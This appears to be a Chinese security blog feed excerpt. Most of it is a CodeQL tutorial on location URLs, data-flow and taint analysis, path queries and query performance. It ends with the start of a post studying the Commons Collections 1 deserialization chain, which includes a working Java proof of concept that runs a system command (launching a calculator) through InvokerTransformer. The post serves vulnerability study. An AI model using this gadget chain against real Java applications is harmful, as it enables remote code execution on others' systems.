<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JiraIssue</span> <span class="keyword">extends</span> <span class="title">ExternalData</span> </span>&#123;</span><br><span class="line">    <span class="type">JiraIssue</span>() &#123;</span><br><span class="line">        getDataPath() = <span class="string">&quot;JiraIssues.csv&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string getKey() &#123;</span><br><span class="line">        result = getField(<span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string getURL() &#123;</span><br><span class="line">        result = <span class="string">&quot;http://mycompany.com/jira/&quot;</span> + getKey()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>文件 URLs</strong></p>
<p><code>file://</code>跟一个绝对路径，后面再跟四个冒号分隔的数字。数字表示开始行、开始列、结束行和结束列。</p>
<ul>
<li><code>file://opt/src/my/file.java:0:0:0:0</code> 表示使用整个文件</li>
<li><code>file:///opt/src/my/file.java:1:1:2:1</code> 从文件开始到第二行的第一个字符。</li>
<li><code>file:///opt/src/my/file.java:1:0:1:0</code> 表示文件的第一行</li>
</ul>
<p>按照惯例，整个文件也可以用 <code>file://</code> 表示，后面不跟数字。或者使用三个数字来表示起始行的位置、长度、字符偏移量。LGTM不会显示这个类型的结果</p>
<p><strong>其他类型的URL</strong></p>
<p>以下不太常见的URL类型是有效的，但LGTM不支持，并且将从任何结果中忽略</p>
<ul>
<li><code>HTTP URLs</code> 某些客户端应用支持。</li>
<li><code>Folder URLs</code> 用法： <code>folder://</code>,后面不跟数字，例如 <code>folder:///opt/src</code></li>
<li><code>Relative file URLs</code> 像正常的文件URLs, 但是以 <code>relative://</code>开始。它们通常的意义是代码数据库的上下文。由于相对位置不变，导入外部信息的时候通常使Relative file URLs。</li>
</ul>
<h3 id="5-3-提供位置信息"><a href="#5-3-提供位置信息" class="headerlink" title="5.3 提供位置信息"></a>5.3 提供位置信息</h3><p>如果没有定义getURL谓词，一个QL类会检查是否存在成员谓词 <code>hasLocationInfo(..)</code>。这可以理解为提供文件URLs的快捷方式而不用考虑写一个URL字符串。<code>hasLocationInfo(..)</code>的第一列必须是字符串类型（文件的URL路径），并且必须有3或4个int类型的字段，</p>
<p>例如，让我们想象一下，提取器提供的方法的位置从方法名称的第一个字符延伸到方法体的右大括号，我们想修改只提取方法名。下面的代码这两种的实现方式。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">class MyMethod extends Method &#123;</span><br><span class="line">    // The locations from the database, which we want <span class="keyword">to</span> modify.</span><br><span class="line">    Location getLocation() &#123; result = super.getLocation() &#125;</span><br><span class="line"></span><br><span class="line">    /* First member predicate: Construct <span class="keyword">a</span> URL <span class="keyword">for</span> the desired location. */</span><br><span class="line">    <span class="built_in">string</span> getURL() &#123;</span><br><span class="line">        <span class="built_in">exists</span>(Location <span class="keyword">loc</span> | <span class="keyword">loc</span> = this.getLocation() |</span><br><span class="line">            result = <span class="string">&quot;file://&quot;</span> + <span class="keyword">loc</span>.getFile().getFullName() +</span><br><span class="line">                <span class="string">&quot;:&quot;</span> + <span class="keyword">loc</span>.getStartLine() +</span><br><span class="line">                <span class="string">&quot;:&quot;</span> + <span class="keyword">loc</span>.getStartColumn() +</span><br><span class="line">                <span class="string">&quot;:&quot;</span> + <span class="keyword">loc</span>.getStartLine() +</span><br><span class="line">                <span class="string">&quot;:&quot;</span> + (<span class="keyword">loc</span>.getStartColumn() + getName().length() - <span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* Second member predicate: Define hasLocationInfo. This will <span class="keyword">be</span> more</span><br><span class="line">       efficient (it avoids constructing long strings), <span class="built_in">and</span> will</span><br><span class="line">       <span class="keyword">only</span> <span class="keyword">be</span> used <span class="keyword">if</span> getURL() <span class="keyword">is</span> not defined. */</span><br><span class="line">    predicate hasLocationInfo(<span class="built_in">string</span> path, <span class="keyword">int</span> <span class="keyword">sl</span>, <span class="keyword">int</span> sc, <span class="keyword">int</span> <span class="keyword">el</span>, <span class="keyword">int</span> <span class="keyword">ec</span>) &#123;</span><br><span class="line">        <span class="built_in">exists</span>(Location <span class="keyword">loc</span> | <span class="keyword">loc</span> = this.getLocation() |</span><br><span class="line">            path = <span class="keyword">loc</span>.getFile().getFullName() <span class="built_in">and</span></span><br><span class="line">            <span class="keyword">sl</span> = <span class="keyword">loc</span>.getStartLine() <span class="built_in">and</span></span><br><span class="line">            sc = <span class="keyword">loc</span>.getStartColumn() <span class="built_in">and</span></span><br><span class="line">            <span class="keyword">el</span> = <span class="keyword">sl</span> <span class="built_in">and</span></span><br><span class="line">            <span class="keyword">ec</span> = sc + getName().length() - <span class="number">1</span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="5-4-使用提取的位置信息"><a href="#5-4-使用提取的位置信息" class="headerlink" title="5.4 使用提取的位置信息"></a>5.4 使用提取的位置信息</h3><p>如果上面的两个谓词失败了，客户端应用会尝试调用<code>getLocation()</code>的无参形式，并且会尝试上面的两个方法，拿到结果后存入数据库，指定表示符，以及使用</p>
<p> <code>getLocation()</code> 返回的类称为<code>Location</code>，并且它会定义一个<code>hasLocationInfo(..)版（或者是</code>getURL()尽管前者更可取）。如果<code>Loacation</code> 类不提供任何成员谓词，就没有可用的位置信息。</p>
<h3 id="5-5-toString谓词"><a href="#5-5-toString谓词" class="headerlink" title="5.5 toString谓词"></a>5.5 toString谓词</h3><p>除了扩展基类的所有类，必须提供<code>string toString()</code>成员谓词。如果不这样做编译器会告警。</p>
<h2 id="6-关于数据流分析"><a href="#6-关于数据流分析" class="headerlink" title="6. 关于数据流分析"></a>6. 关于数据流分析</h2><p>数据流分析用于计算一个变量在程序的各个点上可能保持的值，确定这些值如何在程序中传播以及在何处使用。</p>
<h3 id="6-1-概述"><a href="#6-1-概述" class="headerlink" title="6.1 概述"></a>6.1 概述</h3><p>许多CodeQL查询用于数据流分析，这个可以突出显示潜在的不安全数据的流动，这可能会产生漏洞。这些查询可以帮助你理解程序中的数据使用是否安全。是否将危险的参数传递给了函数，或者敏感数据是否会泄漏，以及强调显示潜在的安全问题，还可以使用数据流分析来了解程序行为的其他方面，通过发现，例如，未初始化的变量使用及资源泄漏。</p>
<p>接下来的部分会对CodeQL的数据流分析做一个简单的介绍。</p>
<p>更多针对特定语言数据流的分析如下地址：</p>
<ul>
<li>“<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-cpp/#analyzing-data-flow-in-cpp">Analyzing data flow in C/C++</a>”</li>
<li>“<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-csharp/#analyzing-data-flow-in-csharp">Analyzing data flow in C#</a>”</li>
<li>“<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-java/#analyzing-data-flow-in-java">Analyzing data flow in Java</a>”</li>
<li>“<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-javascript-and-typescript/#analyzing-data-flow-in-javascript-and-typescript">Analyzing data flow in JavaScript/TypeScript</a>”</li>
<li>“<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-python/#analyzing-data-flow-in-python">Analyzing data flow in Python</a>”</li>
</ul>
<blockquote>
<p>数据流分析一般用路径查询<code>path queries</code></p>
</blockquote>
<h3 id="6-2-数据流图"><a href="#6-2-数据流图" class="headerlink" title="6.2 数据流图"></a>6.2 数据流图</h3><p>CodeQL 数据流库通过对数据流图建模实现对程序的数据流分析。与抽象语法树不同，数据流图不能反映程序的语法结构图，但是对运行时数据流经程序的方式建模。抽象语法树中的节点表示语句或表达式等语法元素。数据流图中的节点，代表运行时语意元素的值。</p>
<p>一些AST([abstract syntax tree)节点（例如表达式）具有相应的数据流节点，但其他（比如if语句）则不然。这是因为表达式在运行时被计算成了一个值，而if语句纯粹是一个控制流构造，不携带值。也还有一些数据流节点根本不对应AST节点。</p>
<p>数据流图中的边（Edges）表示程序元素之间的数据流方式。例如，在表达式 <code>x || y</code> 中，数据流节点对应子表达式x和y，数据流节点也对于完整的表达式 <code>x || y</code> 。有一条边从节点x到节点<code>x || y</code>，代表数据可能从x流向<code>x || y</code>。同样的也有一条边从y到<code>x || y</code>。</p>
<p>局部（Local）数据流和全局（global）数据流的不同之处在于它们考虑的边：局部数据流只考虑属于同一函数的数据流节点之间的边，而忽略函数和对象属性之间的数据流。然而全局数据流也考虑后者。污点追踪引入了不和值流动完全对应的边。但要对运行时某些值是否可能衍生出其他值建模，例如通过一个字符串操作运行。</p>
<p>数据流图使用类对代表图节点的程序元素建模，节点之间的数据流使用谓词来计算边建模。</p>
<p>计算准确完整的数据流图带来了几个挑战：</p>
<ul>
<li>在源代码不可用的情况下，无法通过标准库函数计算数据流。</li>
<li>有些行为直到运行时才确定，这意味着数据流库必须采取额外的步骤来找到潜在的调用目标。</li>
<li>变量之间的别名可能导致单次写入更改多个指针指向的值。</li>
<li>数据流图可能非常大，计算速度也很慢</li>
</ul>
<p>为了客服这些潜在的问题，在库中对两种数据流进行了建模：</p>
<ul>
<li>局部数据流(Local data flow)，关于单个函数中的数据流。在对本地数据流进行推理时。只用考虑同一个函数里两个节点之间的数据流。它通常足够快，对于许多查询，效率高且精确，它通常可以计算CodeQL数据库里所有的函数的局部数据流</li>
<li>全局数据流(Global data flow)，通过计算函数之间的数据流和对象属性，有效地考虑整个程序中的数据流。计算全局数据流通常比局部数据流更耗费时间和计算资源，因此尽可能将查询改进提升效率。</li>
</ul>
<p>许多CodeQL查询包含局部和全局数据流，更多参考 <a href="https://codeql.github.com/codeql-query-help">CodeQL query help</a></p>
<h3 id="6-3-正常数据流-vs-污点传播"><a href="#6-3-正常数据流-vs-污点传播" class="headerlink" title="6.3 正常数据流 vs 污点传播"></a>6.3 正常数据流 vs 污点传播</h3><p>在标准库，区分了正常数据流和污点传播。正常数据流库用于分析数据在程序中每一步流动的值。</p>
<p>例如，如果你追踪不安全的对象<code>x</code>(这可能是一些不可信或潜在的恶意数据)，程序中的某一步可能改变它的值。因此，在一个简单的处理中，例如 <code>y = x + 1</code>，一个正常的数据流分析会突出显示x而不是y。然而，因为y是x派生出来的，也是不可信的对象，因此y也被污染了，分析从x到y的污染称为污点传播。</p>
<p>在QL里，污点追踪通过包含不保留值的步骤来扩展正常数据流，但潜在的不安全对象任然在传播。污点传播库通过保存节点传播的谓词对传播过程建模。</p>
<h2 id="7-编写路径查询"><a href="#7-编写路径查询" class="headerlink" title="7. 编写路径查询"></a>7. 编写路径查询</h2><p>你可以编写路径查询来呈现代码数据库中的数据流信息。</p>
<h3 id="7-1-概述"><a href="#7-1-概述" class="headerlink" title="7.1 概述"></a>7.1 概述</h3><p>安全研究员对程序中的数据流动方式尤其感兴趣。许多漏洞由正常数据流向意外的位置造成的。使用CodeQL编写的路径查询对于分析数据流特别有用，因为它们可以用来跟踪变量从可能的起点（source）到可能的终点（sink）的路径。要对路径建模，你的查询必须体统source和sink点的信息，以及连接它们的数据流步骤。</p>
<p>本主题提供有关如何构造路径查询文件的信息，以便您可以探索与数据流分析结果关联的路径。</p>
<h3 id="7-2-构造路径查询"><a href="#7-2-构造路径查询" class="headerlink" title="7.2 构造路径查询"></a>7.2 构造路径查询</h3><p>路径查询需要确定的元数据和查询谓词，和select语法结构。CodeQL中包含的许多内置边查询遵循一个简单的结构，这取决于你所分析的语言是如何用CodeQL建模的</p>
<p>你应该使用如下的模板</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &lt;language&gt;</span><br><span class="line"><span class="comment">// For some languages (Java/C++/Python) you need to explicitly import the data flow library, such as</span></span><br><span class="line"><span class="comment">// import semmle.code.java.dataflow.DataFlow</span></span><br><span class="line"><span class="keyword">import</span> DataFlow<span class="type">::PathGraph</span></span><br><span class="line"><span class="params">...</span></span><br><span class="line"></span><br><span class="line">from MyConfiguration config, DataFlow<span class="type">::PathNode</span> source, DataFlow<span class="type">::PathNode</span> sink</span><br><span class="line"><span class="keyword">where</span> config.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink.getNode(), source, sink, <span class="string">&quot;&lt;message&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>DataFlow::Pathgraph</code>: 是需要从CodeQL标准库里导入的路径图模块</li>
<li><code>source</code> and <code>sink</code>是路径图的节点， <code>DataFlow::PathNode</code> 是它们的类型</li>
<li><code>MyConfiguration</code> 是一个包含了定义了怎样从source到sink数据流谓词的类。</li>
</ul>
<h3 id="7-3-路径查询的元数据"><a href="#7-3-路径查询的元数据" class="headerlink" title="7.3 路径查询的元数据"></a>7.3 路径查询的元数据</h3><p>路径查询元数据必须包含 <code>@kind path-problem</code>，其他元数据取决于打算如何运行查询，</p>
<h3 id="7-4-生成边解释"><a href="#7-4-生成边解释" class="headerlink" title="7.4 生成边解释"></a>7.4 生成边解释</h3><p>为了生成边解释，你的查询需要计算路径图。这需要你定义一个叫<code>edges</code>的查询谓词，这个谓词定义了正在计算的图的边关系。它用于计算与查询生成的每个结果相关的边（edge)，可以从一个标准数据流库中的路径图模块导入预定义的路径谓词。除了路径图模块，数据流库包含数据流分析中常用的其他类、谓词和模块。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br></pre></td></tr></table></figure>

<p>这条语句从数据流库(<code>DataFlow.qll</code>）导入了 <code>PathGraph</code>模块，这个模块定义了路径(<code>edges</code>)。CodeQL还包括很多额外的库，你还可以导入专门为在各种常见框架和环境中实现数据流分析而设计的库。查看数据流分析中使用的不同库的示例，查看更多关于标准库<a href="https://codeql.github.com/codeql-standard-libraries">standard libraries</a>。</p>
<p>对于所有语言，还可以选择定义节点查询谓词，它指定您感兴趣的路径图的节点。如果节点被定义了，仅选择节点的路径。如果节点没有定义，选择所有可能的节点的路劲。</p>
<h3 id="7-5-定义自己的路径-edges-谓词predicate"><a href="#7-5-定义自己的路径-edges-谓词predicate" class="headerlink" title="7.5 定义自己的路径(edges)谓词predicate"></a>7.5 定义自己的路径(<code>edges</code>)谓词<code>predicate</code></h3><p>可以在自己编写的查询语句体力编写自己的路径谓词。按照如下格式</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">query predicate edges(PathNode <span class="selector-tag">a</span>, PathNode <span class="selector-tag">b</span>) &#123;</span><br><span class="line"><span class="comment">/** Logical conditions which hold if `(a,b)` is an edge in the data flow graph */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更多内容在 <a href="https://codeql.github.com/codeql-standard-libraries">standard CodeQL libraries</a> 搜索edges。</p>
<h3 id="7-6-声明sources和sinks"><a href="#7-6-声明sources和sinks" class="headerlink" title="7.6 声明sources和sinks"></a>7.6 声明sources和sinks</h3><p>在路径查询里面必须提供source和sink信息。这些对象与您正在探索的路径的节点相对应。source和sink的类型和名称必须在查询的from语句中定义，并且类型必须与路径谓词计算的图的节点兼容。</p>
<p>如果你正在查询C/C++, C#, Java, JavaScript, Python, 或者 Ruby 代码（在查询中使用了 <code>import DataFlow::PathGrap</code>代码），source和sink的定义由数据流库中的<code>Configuration</code>类定义。你应该在from语句中声明三个对象。例如：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">from Configuration config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br></pre></td></tr></table></figure>

<p>通过导入数据流库来访问configuration类。这个类包含定义如何处理数据流的谓词。</p>
<ul>
<li><code>isSource()</code> 定义数据可能从何而来</li>
<li><code>isSink()</code> 定义数据可能会流向哪里</li>
</ul>
<p>你也可以通过扩展Configuration类来针对不同的框架环境定义自己的Configuration类，</p>
<h3 id="7-7-定义数据流条件"><a href="#7-7-定义数据流条件" class="headerlink" title="7.7 定义数据流条件"></a>7.7 定义数据流条件</h3><p>where语句定义逻辑条件，where语句可以使用聚合、谓词和逻辑公式来使结果准确。在编写路径查询时，通常会包含一个谓词，该谓词仅在数据从source流向sink时有效。还可以通过使用<code>Configuration</code>配置的 <code>hasFlowPath</code> 谓词指定从source到sink的流。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">where config.has<span class="constructor">FlowPath(<span class="params">source</span>, <span class="params">sink</span>)</span></span><br></pre></td></tr></table></figure>


<h3 id="7-8-Select-语句"><a href="#7-8-Select-语句" class="headerlink" title="7.8 Select 语句"></a>7.8 Select 语句</h3><p>路径查询的select语句由四个字段组成</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> element, <span class="keyword">source</span>, sink, <span class="keyword">string</span></span><br></pre></td></tr></table></figure>

<p><code>element</code>和<code>source</code>分别代表告警的位置和告警的内容，<code>source</code>和<code>sink</code>是路径图中选择的节点。</p>
<p><code>element</code>取决于你要查询的目的和类型，这对安全问题尤其重要。例如，如果你觉得<code>source</code>有问题，最好就显示<code>source</code>元素。相反，如果你觉得应该查看sink就应该选择sink元素显示</p>
<h2 id="8-提升查询性能"><a href="#8-提升查询性能" class="headerlink" title="8. 提升查询性能"></a>8. 提升查询性能</h2><p>提升CodeQL查询语句的性能，遵循如下几条简单指导。</p>
<h3 id="8-1-关于查询性能"><a href="#8-1-关于查询性能" class="headerlink" title="8.1 关于查询性能"></a>8.1 关于查询性能</h3><p>本主题提供了一些关于如何避免可能影响查询性能的常见问题的简单提示，在阅读下面的提示之前，值得重申一下关于CodeQL和QL语言的重要观点。</p>
<ul>
<li>CodeQL的类和谓词都会生成数据库表，大型谓词生成包含许多行的大型表，因此计算成本很高。</li>
<li>QL语言是使用标准数据库操作和关系代数实现的(例如join, projection, 和union)。有关查询语言和数据库的详细信息，看<a href="https://codeql.github.com/docs/ql-language-reference/about-the-ql-language/#about-the-ql-language">About the QL language</a></li>
<li>查询是自下而上计算的，这意味着一个谓词在它所依赖的所有谓词都被求值之前不会被求值。有关查询求值的详细信息，阅读<a href="https://codeql.github.com/docs/ql-language-reference/evaluation-of-ql-programs/#evaluation-of-ql-programs">Evaluation of QL programs</a></li>
</ul>
<h3 id="8-2-关于性能的tips"><a href="#8-2-关于性能的tips" class="headerlink" title="8.2 关于性能的tips"></a>8.2 关于性能的tips</h3><p>遵循以下指导原则，以确保您不会被最常见的CodeQL性能陷阱绊倒。</p>
<p><strong>消除笛卡尔积</strong></p>
<p>谓词的性能通常可以通过大致考虑它有多少个结果来判断。创建性能差的谓词的一种方法是使用两个变量，而不以任何方式将它们关联起来，或者只是用否定来联系他们。这将导致计算每个变量的可能值集之间的笛卡尔积，可能会生成一个庞大的结果表。如果不指定对变量的限制，可能会出现这种情况。例如，考虑以下谓词，检查java方法<code>m</code>是否可以访问字段<code>f</code>：</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">predicate mayAccess(<span class="function"><span class="keyword">Method</span> <span class="title">m</span>, <span class="title">Field</span> <span class="title">f</span>) <span class="comment">&#123;</span></span></span><br><span class="line"><span class="comment"><span class="function">  f.getAnAccess().getEnclosingCallable() = m</span></span></span><br><span class="line"><span class="comment"><span class="function">  or</span></span></span><br><span class="line"><span class="comment"><span class="function">  not exists(m.getBody())</span></span></span><br><span class="line"><span class="comment"><span class="function">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>如果m包含对f的访问，则谓词成立,但也保守地假设没有body的方法（例如，native方法）可以访问任何字段。</p>
<p>然而，如果m是native方法，那么mayAccess计算的表将包含代码库中所有字段f的一行<code>m，f</code>，这使得它可能非常大。</p>
<p>下面的示例展示一个更小的错误</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">extends</span> <span class="title">Class</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// BAD! Does not use ‘this’</span></span><br><span class="line">  <span class="type">Method</span> getToString() &#123;</span><br><span class="line">    result.getName() = <span class="string">&quot;ToString&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getToString()</code>没有声明任何参数，但是有两个隐含参数result和this，并且没有说明。也就是说，每个叫ToString的方法或者Foo的实例，this都会在Foo类的getToString方法被约束。</p>
<p><strong>使用特殊的类型</strong></p>
<p>类型提供了关系大小的上线。这会有助于查询优化器更有效，因此，通常最好使用最具体的类型。例如：</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">predicate</span> <span class="function"><span class="title">foo</span>(<span class="variable">LoggingCall</span> <span class="variable">e</span>)</span></span><br></pre></td></tr></table></figure>

<p>优先于</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">predicate</span> <span class="function"><span class="title">foo</span>(<span class="variable">Expr</span> <span class="variable">e</span>)</span></span><br></pre></td></tr></table></figure>

<p>从类型上下文中，查询优化器推断出程序的某些部分是冗余的，并将其删除或专门化。</p>
<p><strong>确定变量的最具体类型</strong></p>
<p>如果您不熟悉查询中使用的库，可以使用CodeQL确定实体的类型。有一个称为 <code>getAQlClass()</code>的谓词，它会返回最具体的QL实体类型。</p>
<p>例如，如果您使用的是Java数据库，你可以在每一个<code>Expr</code>的调用使用 <code>getAQlClass()</code> </p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Expr e<span class="punctuation">,</span> Callable <span class="keyword">c</span></span><br><span class="line">where</span><br><span class="line">    <span class="keyword">c</span>.getDeclaringType().hasQualifiedName(<span class="string">&quot;my.namespace.name&quot;</span><span class="punctuation">,</span> <span class="string">&quot;MyClass&quot;</span>)</span><br><span class="line">    <span class="keyword">and</span> <span class="keyword">c</span>.getName() <span class="operator">=</span> <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">and</span> e.getEnclosingCallable() <span class="operator">=</span> <span class="keyword">c</span></span><br><span class="line"><span class="keyword">select</span> e<span class="punctuation">,</span> e.getAQlClass()</span><br></pre></td></tr></table></figure>

<p><code>getAQlClass()</code> 适合调试，真正运行的时候就不要用了，会影响性能</p>
<p><strong>避免复杂的递归</strong></p>
<p>您应该尽可能地简化递归谓词</p>
<p><strong>折叠谓词</strong></p>
<p>有时，您可以通过将大型谓词的部分“折叠”成较小的谓词来帮助查询优化器。</p>
<p>一般原则是将工作分成以下几部分：</p>
<ul>
<li>linear(线性)，这样就不会有太多分支。</li>
<li>tightly bound，这样块就可以在尽可能多的变量上相互连接</li>
</ul>
<h2 id="9-Debugging"><a href="#9-Debugging" class="headerlink" title="9 Debugging"></a>9 Debugging</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://codeql.github.com/docs/codeql-overview/">https://codeql.github.com/docs/codeql-overview/</a></li>
<li><a href="https://github.com/github/codeql/tree/main/docs">https://github.com/github/codeql/tree/main/docs</a></li>
</ul>
]]></content>
      <categories>
        <category>代码安全</category>
      </categories>
      <tags>
        <tag>代码安全</tag>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Commons-Collections-1</title>
    <url>/Commons-Collections-1/</url>
    <content><![CDATA[<blockquote>
<p>醉后不知天在水，满船清梦压星河。</p>
</blockquote>
<p>Commons Collections 1反序列化链学习</p>
<span id="more"></span>



<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>在jdk1.2中的更新，主要就是java Collections框架，自从变成java处理collection的标准之后，它强大的数据结构大大提高了开发应用的效率。</p>
<p>Commons-Collections对原有的 java Collections进行了扩展增加，有许多新的特性，包括：</p>
<ul>
<li><p>Bag 接口，为有多个副本的集合对象提供接口</p>
</li>
<li><p>BidiMap接口，为maps提供值到键，键到值的查询接口</p>
</li>
<li><p>MapIterator，为maps的迭代器提供简单快速的接口</p>
</li>
<li><p><strong>每个对象在添加到集合中时，提供改变每个对象的装饰器</strong></p>
</li>
<li><p>使多个集合看起来像复合集合</p>
<p>。。。。。。</p>
</li>
</ul>
<p><strong>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>commons.apache.org<span class="regexp">/proper/</span>commons-collections/index.html</span><br><span class="line">http:<span class="regexp">//</span>archive.apache.org<span class="regexp">/dist/</span>commons<span class="regexp">/collections/</span>binaries/</span><br></pre></td></tr></table></figure>



<h2 id="2-POC复现"><a href="#2-POC复现" class="headerlink" title="2. POC复现"></a>2. POC复现</h2><ol>
<li><p>新建一个maven工程</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>网上流传的poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="3-POC构造"><a href="#3-POC构造" class="headerlink" title="3. POC构造"></a>3. POC构造</h2><h3 id="3-1-直接调用"><a href="#3-1-直接调用" class="headerlink" title="3.1 直接调用"></a>3.1 直接调用</h3><p>看一下InvokerTransformer类的transform函数</p>
